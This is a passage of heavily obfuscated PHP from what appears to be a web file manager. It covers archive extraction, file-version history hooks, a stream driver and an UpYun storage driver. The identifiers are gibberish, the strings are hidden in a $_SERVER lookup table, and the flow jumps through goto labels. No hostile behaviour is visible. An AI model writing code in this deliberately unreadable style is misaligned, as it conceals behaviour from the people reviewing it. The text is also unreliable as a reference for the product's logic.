. kodIO::hashPathSafe($ñ¤îéïç) . $—ªä¸ªí[8]; $—…åøÖ = $¿ƒúëèÃ . $›ú˜‹¼Í[$—ªä¸ªí[1246]]; mk_dir($¿ƒúëèÃ); file_put_contents(TEMP_FILES . $—ªä¸ªí[1225], $—ªä¸ªí[12]); if (IO::exist($—…åøÖ)) { return array($—ªä¸ªí[224] => $—…åøÖ, $—ªä¸ªí[1230] => $‘‹‰çİ, $—ªä¸ªí[1232] => $¿ƒúëèÃ); } $®‘››Â™ = self::localFilePath($ñ¤îéïç); if (!$®‘››Â™) { $®‘››Â™ = $¿ƒúëèÃ . $—ªä¸ªí[1251]; if (!IO::exist($®‘››Â™)) { self::copy($ñ¤îéïç, $¿ƒúëèÃ, !1, get_path_this($®‘››Â™)); } } if (!$®‘››Â™ || !IO::exist($®‘››Â™)) { return !1; } if ($›ú˜‹¼Í[$—ªä¸ªí[1231]] == -1) { return array($—ªä¸ªí[224] => $®‘››Â™, $—ªä¸ªí[1230] => $‘‹‰çİ, $—ªä¸ªí[1232] => $¿ƒúëèÃ); } $»üãºŞü = $®‘››Â™; foreach ($‘‹‰çİ as $—’Â—×¹ => $Áì§éÚ³) { if (!$Áì§éÚ³ || $Áì§éÚ³[$—ªä¸ªí[1231]] == $—ªä¸ªí[1229]) { break; } if (substr($Áì§éÚ³[$—ªä¸ªí[42]], -1, 1) == $—ªä¸ªí[8]) { break; } $ÏÁÊùòĞ = in_array(get_path_ext($Áì§éÚ³[$—ªä¸ªí[1246]]), array($—ªä¸ªí[366], $—ªä¸ªí[1236], $—ªä¸ªí[1237], $—ªä¸ªí[1238], $—ªä¸ªí[1239], $—ªä¸ªí[1240])); $üµ¸Ï—Û = $—’Â—×¹ == count($‘‹‰çİ) - 1 && $ÏÁÊùòĞ; $‡Çû¶ = $¿ƒúëèÃ . $Áì§éÚ³[$—ªä¸ªí[1246]]; $¯óÙéøË = $¿ƒúëèÃ . get_path_this($Áì§éÚ³[$—ªä¸ªí[42]]); if (IO::exist($‡Çû¶)) { $»üãºŞü = $‡Çû¶; continue; } $¿”öÕáÈ = $—’Â—×¹ == 0 ? get_path_ext($é«ëş¥š) : get_path_ext($»üãºŞü); $²¯±«àÊ = KodArchive::extract(self::iconvSystem($»üãºŞü), $¿ƒúëèÃ, $Áì§éÚ³[$—ªä¸ªí[1231]], $Œ´˜Ôóµ, $¿”öÕáÈ); self::unzipErrorCheck($²¯±«àÊ, array($—ªä¸ªí[1252], $ñ¤îéïç, $‘‹‰çİ, $Áì§éÚ³, $‡Çû¶)); if (IO::exist($¯óÙéøË)) { IO::rename($¯óÙéøË, get_path_this($‡Çû¶)); } $»üãºŞü = $‡Çû¶; } $—…åøÖ = $»üãºŞü; return array($—ªä¸ªí[224] => $»üãºŞü, $—ªä¸ªí[1230] => $‘‹‰çİ, $—ªä¸ªí[1232] => $¿ƒúëèÃ); } private static function unzipErrorCheck($Î…¤Ã½, $ÒÉÆì–İ = false) { $úÅşíÁË =& $_SERVER[‚ûòÉ˜ş]; if ($Î…¤Ã½[$úÅşíÁË[1253]]) { return !0; } write_log(array($úÅşíÁË[1254], $Î…¤Ã½, $ÒÉÆì–İ), $úÅşíÁË[1255]); show_json($úÅşíÁË[1256] . json_encode($Î…¤Ã½[$úÅşíÁË[1243]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $°øÂ¼²Ò =& $_SERVER[‚ûòÉ˜ş]; $´‡¼©¸« = $GLOBALS[$°øÂ¼²Ò[6]][$°øÂ¼²Ò[99]]; if ($´‡¼©¸«[$°øÂ¼²Ò[1257]] != 1) { return; } if ($´‡¼©¸«[$°øÂ¼²Ò[1258]] <= 0) { return; } if (isset($_REQUEST[$°øÂ¼²Ò[1259]]) && $_REQUEST[$°øÂ¼²Ò[1259]] == $°øÂ¼²Ò[98]) { return; } Hook::bind($°øÂ¼²Ò[1260], $°øÂ¼²Ò[1261]); Hook::bind($°øÂ¼²Ò[1262], $°øÂ¼²Ò[1263]); Hook::bind($°øÂ¼²Ò[1264], $°øÂ¼²Ò[1265]); Hook::bind($°øÂ¼²Ò[1266], $°øÂ¼²Ò[1267]); Hook::bind($°øÂ¼²Ò[1268], $°øÂ¼²Ò[1269]); Hook::bind($°øÂ¼²Ò[1270], $°øÂ¼²Ò[1271]); } public static function eventBeforeUpload($Œ·¨â) { if ($Œ·¨â[3] && $Œ·¨â[3] != REPEAT_REPLACE) { return; } $àÀùÓ = self::parsePath($Œ·¨â[0]); if (!$àÀùÓ) { return; } self::add($àÀùÓ); } public static function eventBeforeEdit($’®äöØ˜) { $”ìÔÃÏ‚ = self::parsePath($’®äöØ˜[0]); if (!$”ìÔÃÏ‚) { return; } self::add($”ìÔÃÏ‚); } public static function eventBeforeCopyFile($ğˆãÅ¸ß, $™¹ãìêÔ, $Ë÷§ÈÉ™, $Úñß‰”×, $£áèÂà’, $ô‚áî×) { $›¡’¹™ =& $_SERVER[‚ûòÉ˜ş]; if (isset($Ë÷§ÈÉ™->_data[$›¡’¹™[1196]]) && $Ë÷§ÈÉ™->_data[$›¡’¹™[1196]]) { return; } $çæ­·¸Õ = $Ë÷§ÈÉ™->getPathOuter($Úñß‰”×); $–µÇâë† = self::parsePath($çæ­·¸Õ); if (!$–µÇâë†) { return; } self::add($–µÇâë†); } public static function eventBeforeRename($Û‰÷Î·ä) { $™…«„ôÉ =& $_SERVER[‚ûòÉ˜ş]; $¨×Ú£ğÀ = self::parsePath($Û‰÷Î·ä[0]); if (!$¨×Ú£ğÀ) { return; } $ß›Ø†Ù” = self::checkInHistory($¨×Ú£ğÀ); if (!$ß›Ø†Ù”) { return; } if ($ß›Ø†Ù”[$™…«„ôÉ[43]] == $™…«„ôÉ[224]) { $ßéÚÛ…õ = self::listData($¨×Ú£ğÀ); if ($ßéÚÛ…õ && $ßéÚÛ…õ[$™…«„ôÉ[422]]) { self::moveHistory($¨×Ú£ğÀ, $Û‰÷Î·ä[1]); } } else { IO::rename($ß›Ø†Ù”[$™…«„ôÉ[94]], $Û‰÷Î·ä[1]); } } public static function eventBeforeMove($å¼Ê´’«) { $ÖäÜˆ®´ =& $_SERVER[‚ûòÉ˜ş]; $Ê–¨·“ = self::parsePath($å¼Ê´’«[0]); if (!$Ê–¨·“) { return; } $–ğĞğ’ = self::parsePath($å¼Ê´’«[1]); if (!$–ğĞğ’) { return; } $²Íéˆ¦ = $å¼Ê´’«[3]; $¿ÉùÄÈÉ = self::checkInHistory($Ê–¨·“); if (!$¿ÉùÄÈÉ) { return; } $º™¬Šº¸ = self::pathHistory($–ğĞğ’); if ($¿ÉùÄÈÉ[$ÖäÜˆ®´[43]] == $ÖäÜˆ®´[224]) { $ßã½™ïæ = self::listData($Ê–¨·“); $ÂíÉùØù = rtrim($–ğĞğ’, $ÖäÜˆ®´[8]) . $ÖäÜˆ®´[8] . ($²Íéˆ¦ ? $²Íéˆ¦ : get_path_this($Ê–¨·“)); $¦„»ºÂª = self::listData($ÂíÉùØù); if ($ßã½™ïæ && $ßã½™ïæ[$ÖäÜˆ®´[422]] && $¦„»ºÂª && $¦„»ºÂª[$ÖäÜˆ®´[422]]) { return self::clear($Ê–¨·“); } if ($ßã½™ïæ && $ßã½™ïæ[$ÖäÜˆ®´[422]]) { self::moveHistory($Ê–¨·“, $²Íéˆ¦, $º™¬Šº¸); } } else { IO::move($¿ÉùÄÈÉ[$ÖäÜˆ®´[94]], $º™¬Šº¸, !1, $²Íéˆ¦); self::clearEmptyFolder(IO::pathFather($¿ÉùÄÈÉ[$ÖäÜˆ®´[94]])); } } public static function eventAfterRemove($­üˆ³ÙÅ, $ö¢şç•ê) { $¼Ôñ£ Ô =& $_SERVER[‚ûòÉ˜ş]; if (!$ö¢şç•ê) { return; } $¼ö—à´ã = self::parsePath($­üˆ³ÙÅ[0]); if (!$¼ö—à´ã) { return; } $„¡ä­ó‚ = self::checkInHistory($¼ö—à´ã); if (!$„¡ä­ó‚) { return; } if ($„¡ä­ó‚[$¼Ôñ£ Ô[43]] == $¼Ôñ£ Ô[224]) { $ã™Á’ ¦ = self::listData($¼ö—à´ã, !1); if ($ã™Á’ ¦ && $ã™Á’ ¦[$¼Ôñ£ Ô[422]]) { self::clear($¼ö—à´ã, !1); } } else { IO::remove($„¡ä­ó‚[$¼Ôñ£ Ô[94]]); self::clearEmptyFolder(IO::pathFather($„¡ä­ó‚[$¼Ôñ£ Ô[94]])); } } private static function checkInHistory($íûşòâ) { $È­ÉØ©§ = self::pathHistory($íûşòâ); if (!IO::exist($È­ÉØ©§)) { $È­ÉØ©§ .= $_SERVER[‚ûòÉ˜ş][1272]; } return IO::exist($È­ÉØ©§) ? IO::info($È­ÉØ©§) : !1; } private static function parsePath($éÁÂ½‰è) { $Ò®öÜ–÷ =& $_SERVER[‚ûòÉ˜ş]; if (!$éÁÂ½‰è) { return !1; } if ($GLOBALS[$Ò®öÜ–÷[1273]]) { return; } $çÏ¿éŞØ = KodIO::parse($éÁÂ½‰è); $÷ÕŸÃµÑ = $çÏ¿éŞØ[$Ò®öÜ–÷[43]]; $”©ÀÂòÁ = !$÷ÕŸÃµÑ || $÷ÕŸÃµÑ == KodIO::KOD_IO || $÷ÕŸÃµÑ == KodIO::KOD_SHARE_ITEM; if (!$”©ÀÂòÁ || !$çÏ¿éŞØ[$Ò®öÜ–÷[1274]]) { return !1; } if (substr($éÁÂ½‰è, 0, strlen(DATA_PATH . $Ò®öÜ–÷[1275])) == DATA_PATH . $Ò®öÜ–÷[1275]) { return !1; } if ($÷ÕŸÃµÑ == KodIO::KOD_SHARE_ITEM) { $ìÙÃİ¶› = IO::init($éÁÂ½‰è); if ($ìÙÃİ¶›->pathParse[$Ò®öÜ–÷[1192]]) { return self::parsePath($ìÙÃİ¶›->pathParse[$Ò®öÜ–÷[1192]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Šæ—Ü² = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Ò®öÜ–÷[1276]); foreach ($Šæ—Ü² as $¨‰êşŸ) { if (!$÷ÕŸÃµÑ && substr($éÁÂ½‰è, 0, strlen($¨‰êşŸ)) == $¨‰êşŸ) { return !1; } } self::log($GLOBALS[$Ò®öÜ–÷[1187]] . $Ò®öÜ–÷[1277] . $éÁÂ½‰è); return $éÁÂ½‰è; } private static function pathHistory($›»°Şà) { $›ï™¢×Ü =& $_SERVER[‚ûòÉ˜ş]; $ƒ¥Íùõ´ = self::$_historyBase . ltrim(KodIO::clear($›»°Şà), $›ï™¢×Ü[8]); $ƒ¥Íùõ´ = str_replace(array($›ï™¢×Ü[1278]), array($›ï™¢×Ü[1279]), $ƒ¥Íùõ´); return $ƒ¥Íùõ´; } public static function log($éÚºëÅ) { } public static function historyCount($”£­ªÍ«) { $İÔÆœğÃ =& $_SERVER[‚ûòÉ˜ş]; $Şïì¤‘Å = array(); $´˜†’Ğß = array(); foreach ($”£­ªÍ« as $º¢¢ÈŒÈ) { $Æø±´Ê… = get_path_father($º¢¢ÈŒÈ); if (!$´˜†’Ğß[$Æø±´Ê…]) { $´˜†’Ğß[$Æø±´Ê…] = array(); } $´˜†’Ğß[$Æø±´Ê…][] = get_path_this($º¢¢ÈŒÈ); } foreach ($´˜†’Ğß as $Æø±´Ê… => $â¼Œ€ £) { $¯À³î½§ = self::parsePath($Æø±´Ê…); if (!$¯À³î½§) { continue; } foreach ($â¼Œ€ £ as $èÓ£áüã) { $êÎÖ±¤İ = self::listData(rtrim($¯À³î½§, $İÔÆœğÃ[8]) . $İÔÆœğÃ[8] . $èÓ£áüã, !1); if ($êÎÖ±¤İ && $êÎÖ±¤İ[$İÔÆœğÃ[422]]) { $Şïì¤‘Å[rtrim($Æø±´Ê…, $İÔÆœğÃ[8]) . $İÔÆœğÃ[8] . $èÓ£áüã] = count($êÎÖ±¤İ[$İÔÆœğÃ[422]]); } } } return $Şïì¤‘Å; } public static function add($º¦‘‘) { $¼ÒšØû® =& $_SERVER[‚ûòÉ˜ş]; $šÌÉıŞë = self::listData($º¦‘‘); if (!$šÌÉıŞë) { return; } $õø˜÷ïæ = Model($¼ÒšØû®[810])->get($¼ÒšØû®[1280]); $øŠ÷¥ßØ = $GLOBALS[$¼ÒšØû®[6]][$¼ÒšØû®[99]][$¼ÒšØû®[1258]]; $­ª¥ìÀ = $õø˜÷ïæ == $¼ÒšØû®[1281] ? min(5, $øŠ÷¥ßØ) : $øŠ÷¥ßØ; if ($øŠ÷¥ßØ <= 0) { return; } $¢•ÑóóÄ = IO::info($º¦‘‘); $¥¤…‚Å = $šÌÉıŞë[$¼ÒšØû®[422]]; if ($¢•ÑóóÄ[$¼ÒšØû®[86]] == 0) { return; } if ($¢•ÑóóÄ[$¼ÒšØû®[86]] >= 1024 * 1024 * 500) { return !1; } $º×ËÏĞ‘ = IO::hashSimple($º¦‘‘); if ($¥¤…‚Å && $¥¤…‚Å[0][$¼ÒšØû®[648]] == $º×ËÏĞ‘) { return !0; } if (array_key_exists($¼ÒšØû®[227], $¢•ÑóóÄ) && !$¢•ÑóóÄ[$¼ÒšØû®[227]]) { return !1; } $¶ÙÃôÉ„ = short_id(time()); $™¸Æ«½ = array($¼ÒšØû®[451] => $¶ÙÃôÉ„, $¼ÒšØû®[648] => $º×ËÏĞ‘, $¼ÒšØû®[42] => $¢•ÑóóÄ[$¼ÒšØû®[42]] . $¼ÒšØû®[10] . date($¼ÒšØû®[1282]) . rand_string(1), $¼ÒšØû®[86] => $¢•ÑóóÄ[$¼ÒšØû®[86]], $¼ÒšØû®[503] => USER_ID, $¼ÒšØû®[225] => time(), $¼ÒšØû®[1283] => $¼ÒšØû®[12]); IO::mkdir($šÌÉıŞë[$¼ÒšØû®[1284]]); $²¿Á¡÷² = IO::copy($º¦‘‘, $šÌÉıŞë[$¼ÒšØû®[1284]], !1, $™¸Æ«½[$¼ÒšØû®[42]]); if (!$²¿Á¡÷²) { self::clearEmptyFolder($šÌÉıŞë[$¼ÒšØû®[1284]]); return !1; } array_unshift($¥¤…‚Å, $™¸Æ«½); if (count($¥¤…‚Å) > $­ª¥ìÀ) { $ˆ´®Ñ«× = array_slice($¥¤…‚Å, $­ª¥ìÀ); foreach ($ˆ´®Ñ«× as $ä¦óæÈ“) { IO::remove($šÌÉıŞë[$¼ÒšØû®[1284]] . $ä¦óæÈ“[$¼ÒšØû®[42]]); } $¥¤…‚Å = array_slice($¥¤…‚Å, 0, $­ª¥ìÀ); } return self::saveData($šÌÉıŞë[$¼ÒšØû®[1285]], $¥¤…‚Å); } public static function remove($ËîÜ×»–, $½şˆö¦) { $‹ŒõÄç =& $_SERVER[‚ûòÉ˜ş]; $ÜÈÆùÌ = self::listData($ËîÜ×»–); $³·©àÛ  = array(); if (!$ÜÈÆùÌ) { return !1; } foreach ($ÜÈÆùÌ[$‹ŒõÄç[422]] as $ëÀ™¤ƒè) { if ($ëÀ™¤ƒè[$‹ŒõÄç[451]] == $½şˆö¦) { IO::remove($ÜÈÆùÌ[$‹ŒõÄç[1284]] . $ëÀ™¤ƒè[$‹ŒõÄç[42]]); continue; } $³·©àÛ [] = $ëÀ™¤ƒè; } return self::saveData($ÜÈÆùÌ[$‹ŒõÄç[1285]], $³·©àÛ ); } public static function clear($ŠñÍÂÊ°, $­½ˆú±É = true) { $€àôÁÈ =& $_SERVER[‚ûòÉ˜ş]; $¬²›Ô¸Û = self::listData($ŠñÍÂÊ°, $­½ˆú±É); if (!$¬²›Ô¸Û) { return !1; } foreach ($¬²›Ô¸Û[$€àôÁÈ[422]] as $ğÕœ«°) { IO::remove($¬²›Ô¸Û[$€àôÁÈ[1284]] . $ğÕœ«°[$€àôÁÈ[42]]); } return self::saveData($¬²›Ô¸Û[$€àôÁÈ[1285]], array()); } public static function moveHistory($¯¨”ñ™ß, $›‰Æ®ı = '', $ØÜ•¥à„ = '') { $ˆ·Íı¿ =& $_SERVER[‚ûòÉ˜ş]; $º¡»€æ¹ = self::listData($¯¨”ñ™ß, !1); if (!$º¡»€æ¹ || !$º¡»€æ¹[$ˆ·Íı¿[422]]) { return !1; } $§ ßôÜ = $ˆ·Íı¿[1272]; $›‰Æ®ı = $›‰Æ®ı ? $›‰Æ®ı : get_path_this($¯¨”ñ™ß); $ØÜ•¥à„ = $ØÜ•¥à„ ? $ØÜ•¥à„ : $º¡»€æ¹[$ˆ·Íı¿[1284]]; $ĞÛ‘Äş¯ = substr(get_path_this($º¡»€æ¹[$ˆ·Íı¿[1285]]), 0, -strlen($§ ßôÜ)); foreach ($º¡»€æ¹[$ˆ·Íı¿[422]] as $ÀÄ©° => $øÖñû‘¢) { $ï¾°åä = $›‰Æ®ı . substr($øÖñû‘¢[$ˆ·Íı¿[42]], strlen($ĞÛ‘Äş¯)); $íÛØµ… = IO::move($º¡»€æ¹[$ˆ·Íı¿[1284]] . $øÖñû‘¢[$ˆ·Íı¿[42]], $ØÜ•¥à„, !1, $ï¾°åä); if ($íÛØµ…) { $º¡»€æ¹[$ˆ·Íı¿[422]][$ÀÄ©°][$ˆ·Íı¿[42]] = $ï¾°åä; } } $º¡»€æ¹[$ˆ·Íı¿[1285]] = IO::move($º¡»€æ¹[$ˆ·Íı¿[1285]], $ØÜ•¥à„, !1, $›‰Æ®ı . $§ ßôÜ); self::saveData($º¡»€æ¹[$ˆ·Íı¿[1285]], $º¡»€æ¹[$ˆ·Íı¿[422]]); self::clearEmptyFolder($º¡»€æ¹[$ˆ·Íı¿[1284]]); } public static function rollback($ÄÔù™¥¤, $…•›€íû) { $å âİûÍ =& $_SERVER[‚ûòÉ˜ş]; $Š«‘”êã = self::listData($ÄÔù™¥¤); if (!$Š«‘”êã) { return; } $òªÆ¡ù = IO::info($ÄÔù™¥¤); foreach ($Š«‘”êã[$å âİûÍ[422]] as $×‡ú÷Ş => $õÜ¤½Ó) { if ($õÜ¤½Ó[$å âİûÍ[451]] == $…•›€íû) { self::add($ÄÔù™¥¤); $ù™ìÖ»Ù = $Š«‘”êã[$å âİûÍ[1284]] . $õÜ¤½Ó[$å âİûÍ[42]]; $–á…Ï‰Ç = IO::copy($ù™ìÖ»Ù, IO::pathFather($ÄÔù™¥¤), REPEAT_REPLACE, $òªÆ¡ù[$å âİûÍ[42]]); if ($–á…Ï‰Ç) { self::remove($ÄÔù™¥¤, $…•›€íû); } return $–á…Ï‰Ç; } } return !1; } public static function setDetail($Œ¬õÆù¿, $Ğóâçù, $Šáø÷“£) { $‘•¶êÑï =& $_SERVER[‚ûòÉ˜ş]; $¸ö×ë¤‰ = self::listData($Œ¬õÆù¿); if (!$¸ö×ë¤‰) { return; } foreach ($¸ö×ë¤‰[$‘•¶êÑï[422]] as $…ŒøñÎ½ => $¦ò›ï) { if ($¦ò›ï[$‘•¶êÑï[451]] == $Ğóâçù) { $¸ö×ë¤‰[$‘•¶êÑï[422]][$…ŒøñÎ½][$‘•¶êÑï[1283]] = $Šáø÷“£; self::saveData($¸ö×ë¤‰[$‘•¶êÑï[1285]], $¸ö×ë¤‰[$‘•¶êÑï[422]]); return !0; } } return !1; } public static function fileInfo($ö‘ƒöÍÕ, $ûÅ’½Õ) { $Ä‚–Ó‘« =& $_SERVER[‚ûòÉ˜ş]; $Ï¼ßĞÂ = self::listData($ö‘ƒöÍÕ); if (!$Ï¼ßĞÂ) { show_json(LNG($Ä‚–Ó‘«[115]), !1); } $ö´‰ìÍ‰ = $Ä‚–Ó‘«[12]; foreach ($Ï¼ßĞÂ[$Ä‚–Ó‘«[422]] as $Øïà¡¶ª => $’ô„†ëˆ) { if ($’ô„†ëˆ[$Ä‚–Ó‘«[451]] != $ûÅ’½Õ) { continue; } $ö´‰ìÍ‰ = $Ï¼ßĞÂ[$Ä‚–Ó‘«[1284]] . $’ô„†ëˆ[$Ä‚–Ó‘«[42]]; break; } if (!$ö´‰ìÍ‰) { show_json(LNG($Ä‚–Ó‘«[115]), !1); } return IO::info($ö´‰ìÍ‰); } public static function fileOut($÷ÎÆÚÓã, $ÙÁõ¯¹¡, $ÕøŒÁÜ = false) { $³‰œ‡ƒ¢ =& $_SERVER[‚ûòÉ˜ş]; $ŸêÆÖÂÎ = self::fileInfo($÷ÎÆÚÓã, $ÙÁõ¯¹¡); $é¥‘í×¤ =& $GLOBALS[$³‰œ‡ƒ¢[7]]; $ÕøŒÁÜ = isset($é¥‘í×¤[$³‰œ‡ƒ¢[1235]]) && $é¥‘í×¤[$³‰œ‡ƒ¢[1235]] == 1; if (isset($é¥‘í×¤[$³‰œ‡ƒ¢[43]]) && $é¥‘í×¤[$³‰œ‡ƒ¢[43]] == $³‰œ‡ƒ¢[1286]) { return IO::fileOutImage($ŸêÆÖÂÎ[$³‰œ‡ƒ¢[94]], $é¥‘í×¤[$³‰œ‡ƒ¢[1287]]); } IO::fileOut($ŸêÆÖÂÎ[$³‰œ‡ƒ¢[94]], $ÕøŒÁÜ, get_path_this($÷ÎÆÚÓã)); } public static function listData($×Ü÷³³í, $Ó©–ì•í = true) { $ôêîñÁ§ =& $_SERVER[‚ûòÉ˜ş]; if ($Ó©–ì•í && !IO::exist($×Ü÷³³í)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($×Ü÷³³í, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¾¨ÌØÎä = self::pathHistory($×Ü÷³³í); $°£¬ª¤º = array($ôêîñÁ§[1285] => $¾¨ÌØÎä . $ôêîñÁ§[1272], $ôêîñÁ§[1284] => rtrim(get_path_father($¾¨ÌØÎä), $ôêîñÁ§[8]) . $ôêîñÁ§[8], $ôêîñÁ§[422] => array()); $Çö‘£æü = IO::getContent($°£¬ª¤º[$ôêîñÁ§[1285]]); if ($Çö‘£æü) { $ˆÄ¦¶Ï¼ = json_decode($Çö‘£æü, !0); if (is_array($ˆÄ¦¶Ï¼)) { $°£¬ª¤º[$ôêîñÁ§[422]] = $ˆÄ¦¶Ï¼; } } return $°£¬ª¤º; } private static function saveData($µ¥µË•, $â¾‘¸œÆ) { $şˆİ©ÎŞ =& $_SERVER[‚ûòÉ˜ş]; self::log($şˆİ©ÎŞ[1288] . $µ¥µË• . $şˆİ©ÎŞ[81] . count($â¾‘¸œÆ), $şˆİ©ÎŞ[791]); if ($â¾‘¸œÆ) { return IO::setContent($µ¥µË•, json_encode($â¾‘¸œÆ)); } $©»¾ªû‰ = IO::pathFather($µ¥µË•); IO::remove($µ¥µË•); self::clearEmptyFolder($©»¾ªû‰); return !0; } public static function clearEmptyFolder($‰èŸõ…) { $Ê°è¤Ûş =& $_SERVER[‚ûòÉ˜ş]; if (trim($‰èŸõ…, $Ê°è¤Ûş[8]) == trim(self::$_historyBase, $Ê°è¤Ûş[8])) { return; } $á†ªÛ‹â = IO::pathFather($‰èŸõ…); $³ªê‘û = IO::has($‰èŸõ…, !0); if ($³ªê‘û[$Ê°è¤Ûş[233]] > 0 || $³ªê‘û[$Ê°è¤Ûş[234]] > 0) { return; } IO::remove($‰èŸõ…); self::clearEmptyFolder($á†ªÛ‹â); } private static function getBasePath() { $¾Î³€ÇË =& $_SERVER[‚ûòÉ˜ş]; $›¦éå¦ö = Model($¾Î³€ÇË[1289])->get($¾Î³€ÇË[1290]); if ($›¦éå¦ö) { if (!IO::exist($›¦éå¦ö)) { IO::mkdir($›¦éå¦ö); } if (get_path_this($›¦éå¦ö) == $¾Î³€ÇË[1275]) { $«µ™íÇ = $¾Î³€ÇË[1291] . rand_string(8); @rename($›¦éå¦ö, get_path_father($›¦éå¦ö) . $¾Î³€ÇË[8] . $«µ™íÇ); $›¦éå¦ö = DATA_PATH . $«µ™íÇ . $¾Î³€ÇË[8]; file_put_contents(DATA_PATH . $¾Î³€ÇË[1225], $¾Î³€ÇË[12]); Model($¾Î³€ÇË[1289])->set($¾Î³€ÇË[1290], $›¦éå¦ö); } return $›¦éå¦ö; } $›¦éå¦ö = DATA_PATH . $¾Î³€ÇË[1291] . rand_string(8) . $¾Î³€ÇË[8]; $›¦éå¦ö = IO::mkdir($›¦éå¦ö); $›¦éå¦ö = rtrim($›¦éå¦ö, $¾Î³€ÇË[8]) . $¾Î³€ÇË[8]; file_put_contents($›¦éå¦ö . $¾Î³€ÇË[1225], $¾Î³€ÇË[12]); file_put_contents(DATA_PATH . $¾Î³€ÇË[1225], $¾Î³€ÇË[12]); Model($¾Î³€ÇË[1289])->set($¾Î³€ÇË[1290], $›¦éå¦ö); return $›¦éå¦ö; } } goto FÚó¨Òö×ì; d¯¼ëÁ¼: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÁôŠë¢í, $áıâ¹ç = 0) { parent::__construct(); $this->source = $ÁôŠë¢í; $this->sourceSize = $áıâ¹ç; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Üè”Ó = false) { return $this->sourceSize; } public function getContent($àäùˆÍÌ = false) { return $this->fileSubstr($àäùˆÍÌ, 0, $this->sourceSize); } public function fileSubstr($¡šêËú = false, $ó›éòŠ† = 0, $ŒÉ‚°¥ = 0) { if (!$ŒÉ‚°¥) { $ŒÉ‚°¥ = $this->sourceSize; } $¥şó°ì = $this->sourceSize - $ó›éòŠ†; if ($ŒÉ‚°¥ >= $¥şó°ì) { $ŒÉ‚°¥ = $¥şó°ì; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ó›éòŠ†, $ŒÉ‚°¥); } if ($this->sourceType == self::TYPE_FILE) { if ($ŒÉ‚°¥ <= 0) { return $_SERVER[‚ûòÉ˜ş][12]; } $‰ôÄ¥çé = ftell($this->source); fseek_64($this->source, $‰ôÄ¥çé + $ó›éòŠ†); $¸Š–Õşò = @fread($this->source, $ŒÉ‚°¥); fseek_64($this->source, $‰ôÄ¥çé); return $¸Š–Õşò; } } public function hashMd5($„˜êÓŒ„ = false) { return md5($this->getContent()); } public static function hash($ÎúñÖÁ›, $»ç…îæš = 0) { $º–…¨¾• = new PathDriverStream($ÎúñÖÁ›, $»ç…îæš); return $º–…¨¾•->hashSimple($ÎúñÖÁ›); } public static function md5($Öéæ·Ç­, $šù âŠ = 0) { $õŸÚ»Š = new PathDriverStream($Öéæ·Ç­, $šù âŠ); return $õŸÚ»Š->hashMd5($Öéæ·Ç­); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\x2f\166\60\x2e\141\x70\x69\x2e\x75\160\x79\x75\156\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($âÇôåµ‚) { parent::__construct(); $this->_init($âÇôåµ‚); } public function _init($ÏæƒÖŠ) { $£å×Š¡â =& $_SERVER[‚ûòÉ˜ş]; foreach ($ÏæƒÖŠ as $¯£¹‘¿ğ => $¾“«Ú¥Î) { if (isset($this->{$¯£¹‘¿ğ})) { $this->{$¯£¹‘¿ğ} = $¾“«Ú¥Î; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($£å×Š¡â[1479] . LNG($£å×Š¡â[1410])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ûÅ›È¡Š, $ˆæå­Ë = "\107\x45\124") { $êä×åˆ­ =& $_SERVER[‚ûòÉ˜ş]; $²µŒ‘Üõ = gmdate($êä×åˆ­[1443]); $ö­‘İÄ = base64_encode(hash_hmac($êä×åˆ­[1480], "{$ˆæå­Ë}\x26{$ûÅ›È¡Š}\46{$²µŒ‘Üõ}", md5("{$this->userpass}"), !0)); $Şùúû’ƒ = array("\x41\165\x74\150\157\162\x69\172\141\x74\151\x6f\156\x3a\125\x50\131\x55\x4e\x20{$this->username}\72{$ö­‘İÄ}", "\x44\141\164\x65\x3a{$²µŒ‘Üõ}"); return $Şùúû’ƒ; } public function ussRequest($´Ê‘Œ¯ë, $Æ–í°– = "\x47\105\124", $´×û  ß = false, $´Ï—Á = false, $ø³ÍåÎ¬ = false) { $®ş¯‚©Ö =& $_SERVER[‚ûòÉ˜ş]; $´Ê‘Œ¯ë = trim($´Ê‘Œ¯ë, $®ş¯‚©Ö[8]); $Çİı½æ­ = "\57{$this->bucket}\57{$´Ê‘Œ¯ë}"; $ÓËæ Â¨ = $this->ussHeaders($Çİı½æ­, $Æ–í°–); if ($´Ï—Á) { $ÓËæ Â¨ = array_merge($ÓËæ Â¨, $´Ï—Á); } $°¼ÂØ­£ = url_request($this->endpoint . $Çİı½æ­, $Æ–í°–, $´×û  ß, $ÓËæ Â¨, $ø³ÍåÎ¬); if (!$°¼ÂØ­£) { return array($®ş¯‚©Ö[1253] => !1, $®ş¯‚©Ö[1243] => $®ş¯‚©Ö[1481]); } if (strtolower($Æ–í°–) == $®ş¯‚©Ö[221] || in_array($°¼ÂØ­£[$®ş¯‚©Ö[1253]], array($®ş¯‚©Ö[266], $®ş¯‚©Ö[1482]))) { $´×û  ß = $°¼ÂØ­£[$®ş¯‚©Ö[1483]]; } else { $´×û  ß = json_decode($°¼ÂØ­£[$®ş¯‚©Ö[1243]], !0); if (!$´×û  ß) { $´×û  ß = $°¼ÂØ­£[$®ş¯‚©Ö[1243]]; } else { if (!$°¼ÂØ­£[$®ş¯‚©Ö[790]] && isset($´×û  ß[$®ş¯‚©Ö[1484]])) { $´×û  ß = $´×û  ß[$®ş¯‚©Ö[1484]]; } } } return array($®ş¯‚©Ö[1253] => $°¼ÂØ­£[$®ş¯‚©Ö[790]], $®ş¯‚©Ö[1243] => $´×û  ß); } public function mkfile($öæì¯Êí, $àî´äÊ = '', 